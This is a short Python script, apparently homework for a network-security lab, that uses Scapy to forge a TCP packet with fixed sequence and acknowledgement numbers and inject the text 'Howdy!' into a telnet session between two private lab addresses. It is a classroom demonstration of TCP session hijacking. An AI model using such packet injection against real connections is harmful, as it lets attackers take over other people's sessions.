#!/usr/bin/python
# Homework 5, Task 6: TCP Session Hijacking

from scapy.all import *

ip = IP(src="10.0.2.4", dst="10.0.2.5")
tcp = TCP(sport=44488, dport=23, flags="A", seq=529030455, ack=1060327120)
data = "Howdy!"
pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0)

